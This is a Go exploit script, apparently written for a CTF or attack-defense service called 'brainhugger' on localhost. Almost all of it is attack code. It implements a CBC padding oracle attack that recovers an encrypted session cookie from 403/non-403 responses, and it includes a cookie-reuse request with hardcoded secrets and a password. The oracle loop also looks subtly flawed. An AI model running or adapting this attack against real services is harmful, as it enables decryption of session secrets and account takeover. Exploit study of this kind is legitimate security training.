package main

import (
	"brainhugger/backend/cbc"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"sync"
)

type Task struct {
	Source string
	Stdin  string
	Token  string
	OwnerId uint
}

type User struct {
	Password string
}

func addNewTask(wg *sync.WaitGroup, source, stdin, token string, owner uint) []byte {
	defer wg.Done()
	task := Task{
		Source:  source,
		Stdin:   stdin,
		Token:   token,
		OwnerId: owner,
	}
	data, err := json.Marshal(task)
	if err != nil {
		panic("can not marshal task: " + err.Error())
	}
	resp, err := http.Post("http://0.0.0.0:8080/run_task", "json", bytes.NewReader(data))
	if err != nil {
		panic("can not make post-request: " + err.Error())
	}
	if resp.StatusCode != 200 {
		panic(fmt.Sprintf("status code: %v", resp.StatusCode))
	}
	res, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic("can not read body: " + err.Error())
	}
	return res
}

func addNewUser(wg *sync.WaitGroup, password string) []byte {
	defer wg.Done()
	user := User{
		Password: password,
	}
	data, err := json.Marshal(user)
	if err != nil {
		panic("can not marshal task: " + err.Error())
	}
	resp, err := http.Post("http://0.0.0.0:8080/register", "json", bytes.NewReader(data))
	if err != nil {
		panic("can not make post-request: " + err.Error())
	}
	if resp.StatusCode != 200 {
		panic(fmt.Sprintf("status code: %v", resp.StatusCode))
	}
	res, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic("can not read body: " + err.Error())
	}
	return res
}

func tryDecr(userId uint, encrypted []byte) bool {
	secretB64 := base64.StdEncoding.EncodeToString(encrypted)
	req, err := http.NewRequest("GET", "http://localhost:8080/task_info/4", nil)
	if err != nil {
		panic(err)
	}
	req.AddCookie(&http.Cookie{Name: "secret", Value: secretB64})
	req.AddCookie(&http.Cookie{Name: "uid", Value: fmt.Sprint(userId)})
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	return resp.StatusCode == 403
}

func paddingOrcaleAttack(userId uint, encrypted1 []byte) string {
	encrypted := append(cbc.InitVector, encrypted1[:16]...)
	encryptedCopy := append(cbc.InitVector, encrypted1[:16]...)
	result := make([]byte, 16)
	i2 := make([]byte, 16)
	for k := 1; k < 17; k++ {
		for j := 0; j < k - 1; j++ {
			encrypted[15 - j] = i2[15 - j] ^ byte(k)
		}
		for i := 0; i < 256; i++ {
			if _, err1 := rand.Read(encrypted[:16 - k]); err1 != nil {
				panic(err1)
			}
			encrypted[16 - k] = byte(i)
			if tryDecr(userId, encrypted) {
				i2[16 - k] = byte(i) ^ byte(k)
				result[16 - k] = i2[16 - k] ^ encryptedCopy[16 - k]
			}
		}
	}
	return string(result)
}

func examplePOA() {
	secret, err := base64.StdEncoding.DecodeString("WldaJgo+J7USZwEQBHjyKA==")
	if err != nil {
		panic(err)
	}
	fmt.Println(paddingOrcaleAttack(3, secret))
}

func exampleCookieLeaking() {
	secret := "XwcPJnI7IBJyYo4WZH2S3Q=="
	userId := 4
	req, err := http.NewRequest("GET", "http://localhost:8080/check?userid=1&password=kekeke", nil)
	if err != nil {
		panic(err)
	}
	req.AddCookie(&http.Cookie{Name: "secret", Value: secret})
	req.AddCookie(&http.Cookie{Name: "uid", Value: fmt.Sprint(userId)})
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	fmt.Println(resp)
}

func main() {

}
